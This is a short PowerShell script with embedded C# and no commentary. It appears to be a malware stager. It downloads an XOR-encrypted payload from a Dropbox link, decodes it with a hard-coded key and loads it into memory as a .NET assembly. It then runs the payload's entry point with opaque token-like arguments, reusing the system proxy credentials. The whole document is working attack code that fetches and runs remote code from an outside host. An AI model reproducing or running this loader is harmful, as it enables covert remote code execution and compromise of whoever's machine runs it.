
$S = @"
using System;
using System.Net;
using System.Reflection;
namespace n {
public static class c {
public static void l() {
WebClient wc = new WebClient();
IWebProxy dp = WebRequest.DefaultWebProxy;
if (dp != null) {
    dp.Credentials = CredentialCache.DefaultCredentials;
    wc.Proxy = dp;
}
byte[] b = wc.DownloadData("https://www.dropbox.com/s/z8fk603cybfvpmc/default.aa?dl=1");
string k = "d584596d2404a7f2409d1508a9134b60f22d909e4de015d39bfd01010199a7ed";
for(int i = 0; i < b.Length; i++) { b[i] = (byte) (b[i] ^  k[i % k.Length]); }
string[] parameters = new string[] {"fQ3BQYzqGrAAAAAAAAAACOySE1xCwgtKF2ESFclqtkRlhK9rKDa9hZQh_8Mt_hi9", "kFJHsQJAwJXaT40EmaA3Mw=="};
object[] args = new object[] {parameters};
Assembly a = Assembly.Load(b);
MethodInfo method = a.EntryPoint;
object o = a.CreateInstance(method.Name);
method.Invoke(o, args); }}}
"@
Add-Type -TypeDefinition $S -Language CSharp
[n.c]::l()

